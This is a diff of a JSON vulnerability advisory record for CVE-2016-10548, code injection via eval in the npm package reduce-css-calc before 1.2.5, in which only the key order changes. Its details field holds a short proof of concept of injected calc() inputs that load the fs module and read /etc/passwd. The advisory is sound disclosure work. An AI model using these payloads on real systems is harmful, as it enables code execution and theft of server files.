@@ -1,21 +1,45 @@
 {
-  "id": "GHSA-4662-j96g-mv46",
-  "summary": "Arbitrary Code Injection in reduce-css-calc",
-  "details": "Affected versions of `reduce-css-calc` pass input directly to `eval`. If user input is passed into the calc function, this may result in cross-site scripting on the browser, or remote code execution on the server.\n\n## Proof of Concept\n\n```\nconst reduceCSSCalc = require('reduce-css-calc');\nconsole.log(reduceCSSCalc(`calc(                       (Buffer(10000)))`));\nconsole.log(reduceCSSCalc(`calc(                       (global['fs'] = require('fs')))`));\nconsole.log(reduceCSSCalc(`calc(                       (fs['readFileSync'](\"/etc/passwd\", \"utf-8\")))`));\n```\n\n\n\n## Recommendation\n\nUpdate to version 1.2.5 or later.",
+  "affected": [
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2018/06/GHSA-4662-j96g-mv46/GHSA-4662-j96g-mv46.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "reduce-css-calc",
+        "purl": "pkg:npm/reduce-css-calc"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.2.5"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    }
+  ],
   "aliases": [
     "CVE-2016-10548"
   ],
-  "modified": "2023-11-08T03:58:11.888099Z",
-  "published": "2018-06-07T19:43:06Z",
   "database_specific": {
-    "nvd_published_at": null,
     "cwe_ids": [
       "CWE-94"
     ],
-    "severity": "CRITICAL",
     "github_reviewed": true,
-    "github_reviewed_at": "2020-06-16T20:57:38Z"
+    "github_reviewed_at": "2020-06-16T20:57:38Z",
+    "nvd_published_at": null,
+    "severity": "CRITICAL"
   },
+  "details": "Affected versions of `reduce-css-calc` pass input directly to `eval`. If user input is passed into the calc function, this may result in cross-site scripting on the browser, or remote code execution on the server.\n\n## Proof of Concept\n\n```\nconst reduceCSSCalc = require('reduce-css-calc');\nconsole.log(reduceCSSCalc(`calc(                       (Buffer(10000)))`));\nconsole.log(reduceCSSCalc(`calc(                       (global['fs'] = require('fs')))`));\nconsole.log(reduceCSSCalc(`calc(                       (fs['readFileSync'](\"/etc/passwd\", \"utf-8\")))`));\n```\n\n\n\n## Recommendation\n\nUpdate to version 1.2.5 or later.",
+  "id": "GHSA-4662-j96g-mv46",
+  "modified": "2023-11-08T03:58:11.888099Z",
+  "published": "2018-06-07T19:43:06Z",
   "references": [
     {
       "type": "ADVISORY",
@@ -34,30 +58,6 @@
       "url": "https://www.npmjs.com/advisories/144"
     }
   ],
-  "affected": [
-    {
-      "package": {
-        "name": "reduce-css-calc",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/reduce-css-calc"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "0"
-            },
-            {
-              "fixed": "1.2.5"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2018/06/GHSA-4662-j96g-mv46/GHSA-4662-j96g-mv46.json"
-      }
-    }
-  ],
-  "schema_version": "1.6.0"
+  "schema_version": "1.6.0",
+  "summary": "Arbitrary Code Injection in reduce-css-calc"
 }
